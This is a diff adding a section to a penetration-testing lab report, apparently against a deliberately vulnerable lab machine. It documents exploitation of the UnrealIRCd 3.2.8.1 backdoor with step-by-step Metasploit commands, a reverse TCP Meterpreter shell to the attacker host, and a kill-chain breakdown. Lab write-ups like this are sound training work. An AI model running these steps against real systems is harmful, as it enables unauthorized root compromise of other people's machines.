@@ -64,3 +64,33 @@ Key findings — 23 open ports in total, including several with well-known vulne
   - **Command & Control:** The reverse TCP Meterpreter session gave an ongoing remote control channel back to Kali.
   - **Actions on Objectives:** Ran sysinfo and getuid to confirm full root-level access to the target.
 - **Outcome / Impact:** Achieved a root-level Meterpreter session on the target with no authentication required — full compromise of the system via a single FTP connection.
+
+
+
+---
+
+## Exploit 2: UnrealIRCd 3.2.8.1 Backdoor
+
+- **Service / Port:** IRC / 6667
+- **Vulnerability:** UnrealIRCd 3.2.8.1 distribution archives were compromised and included a backdoor that executes arbitrary commands when a specially crafted string is sent through the IRC connection.
+- **Tool Used:** Metasploit — exploit/unix/irc/unreal_ircd_3281_backdoor
+- **Why This Tool:** Recon identified UnrealIRCd running on port 6667. Metasploit provides a dedicated "excellent" rated module for this specific known backdoor, making it far more reliable than attempting to manually replicate the backdoor trigger sequence over a raw IRC connection.
+- **Steps:**
+  1. `background` (to exit the previous Meterpreter session)
+  2. `back`
+  3. `search unrealircd`
+  4. `use exploit/unix/irc/unreal_ircd_3281_backdoor`
+  5. `set RHOSTS 192.168.100.204`
+  6. `set LHOST 192.168.100.253`
+  7. `run`
+  8. Confirmed access with `sysinfo` and `getuid` inside the resulting Meterpreter session
+- **Evidence:** evidence/exploit2.png
+- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control, Actions on Objectives
+  - **Reconnaissance:** The nmap scan identified UnrealIRCd running on port 6667.
+  - **Weaponization:** Selecting the unreal_ircd_3281_backdoor module and configuring RHOSTS/LHOST paired the known vulnerability with a working payload.
+  - **Delivery:** Metasploit registered an IRC user and sent the backdoor trigger string to the target's IRC service.
+  - **Exploitation:** The planted backdoor executed the delivered command, triggering code execution.
+  - **Installation:** The Meterpreter payload was delivered and executed, establishing a foothold.
+  - **Command & Control:** The reverse TCP Meterpreter session gave an ongoing remote control channel back to Kali.
+  - **Actions on Objectives:** Ran sysinfo and getuid to confirm full root-level access to the target.
+- **Outcome / Impact:** Achieved a second, independent root-level Meterpreter session on the target via a completely different service (IRC instead of FTP), demonstrating the target has multiple unrelated critical vulnerabilities.
